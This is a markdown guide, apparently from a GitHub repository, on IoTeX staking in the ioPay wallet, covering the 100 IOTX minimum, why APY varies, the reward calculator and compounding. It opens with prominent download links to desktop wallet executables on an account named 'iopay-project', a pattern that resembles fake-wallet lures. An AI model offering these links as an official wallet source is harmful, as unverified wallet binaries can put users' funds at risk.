![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# IoTeX Staking Rewards: APY, Minimums and Using the Calculator

Two numbers people want from this page, and only one of them exists: the **minimum and maximum you can stake** are fixed by the protocol. **The APY is not** - it moves with the chain's reward schedule and your validator's commission, so a page quoting one percentage is quoting a snapshot and calling it a fact.

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

Here is the fixed part, the method for the variable part, and how to project your own earnings before you commit anything.

## What is actually fixed

A stake needs **100 IOTX** to exist, durations run in **7-day** steps up to **1050 days**, and there is no maximum stake. Those are protocol constants rather than settings, and [the staking guide](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/how-to-stake-iotx-in-iopay-wallet.md) carries them beside the bucket and stake-lock mechanics they belong to. For a projection they matter as shape: every figure is for a whole number of steps, and anything under the floor is not a stake at all.

## Why there is no single APY

IoTeX staking rewards come from the chain's reward schedule, split between validators and delegators according to each validator's commission. That produces two moving parts:

- **The schedule** - set by the protocol and subject to governance, so it can change.
- **The validator's share** - different for every operator, and visible in the wallet's comparison view alongside uptime.

A number like "APY is X%" is therefore true only for a specific validator at a specific moment. The wallet shows each validator's current APY, and it changes. Any article - including this one - that prints a fixed figure is describing a day, not a rule.

What you can rely on: **the method**. Current APY for your chosen validator, minus their commission treatment, applied to your staked amount over your duration, with the caveat that the rate can move during that duration.

## Using the calculator

The wallet's staking section includes a reward calculator that takes an amount and a duration and projects **daily, monthly and yearly** earnings before you sign anything (F022).

How to read its output honestly:

- **It is a projection at the current rate**, not a contract. If the rate falls next month, the projection was still arithmetically correct when it was made.
- **It does not model compounding** unless you add it yourself. Compounding changes the shape of the curve, not the rate.
- **It does not include slashing**, because slashing is a risk event, not a scheduled cost.

A worked pattern, without inventing a rate: take your amount, multiply by the validator's displayed APY for a year, and that is your gross annual figure at that rate. Divide by 365 for a day, by 12 for a month. Then subtract the validator's commission if the displayed APY is gross rather than net - and check which it is, because interfaces differ.

## Compounding

Rewards can be re-staked in one click (F022), which puts them back to work instead of leaving them idle.

Two things to know before you do:

- **Compounding can create a separate bucket** rather than growing the original. That is normal, and it means your position is now more than one bucket - worth knowing when you look for rewards later.
- **Compounding does not change the rate.** It changes how much principal is earning it. At a stable rate, the difference between compounding and not is small early and larger over long durations.

[Compounding rewards](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/how-to-compound-iotx-rewards-in-iopay.md) covers the mechanics; [burn-drop](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iotex-burn-drop-rewards-in-iopay.md) is the separate mechanism where device activity restakes to qualified buckets.

## What the calculator will not tell you

**Your vote count.** Votes are governance weight, not tokens, and they have no place in an earnings projection - that figure is not principal and not a return. [The staking guide](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/how-to-stake-iotx-in-iopay-wallet.md) explains why the two numbers diverge.

**Whether you will be able to exit on a given day.** Exit takes days from when the countdown starts, so a projection that ends on your last day assumes you began exiting before it - [the timing](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iotex-unstaking-period-explained-for-iopay-users.md).

**What the rate will be in a year.** Nobody knows. Plan on the range, not the point.

## Questions people actually ask

**What APY does IoTeX staking pay?**
It is not fixed. Each validator shows a current APY in the wallet, and it moves with the chain's reward schedule and that validator's commission. Compare validators rather than looking for one number.

**How much will I earn if I stake a set amount of IOTX?**
Use the calculator: enter the amount and duration, and read the daily, monthly and yearly projection at the current rate. The arithmetic is reliable; the rate is the assumption.

**What is the minimum IOTX I can stake, and for how long?**
**100 IOTX**, for up to **1050 days** in **7-day** steps, with no maximum stake. [The staking guide](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/how-to-stake-iotx-in-iopay-wallet.md) covers what a duration commits you to.

**Does a longer duration pay more?**
Not automatically. Duration is a commitment, not a bonus tier - the rate comes from the validator and the schedule.

**Can I withdraw early?**
Only by starting the exit - stake-lock off, then the countdown. [Unstaking explained](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iotex-unstaking-period-explained-for-iopay-users.md).

**Are rewards paid in IOTX?**
Rewards accrue to the staking position in IOTX and are withdrawn with it. Under IIP-59 they are protocol-native - there is no separate off-chain claim step.

---

*Parameters are IoTeX protocol values; the calculator's behaviour is from the v2.0.2 feature set. No APY figure is quoted here, deliberately: a fixed number would be wrong within weeks and would mislead exactly the reader this page is for.*
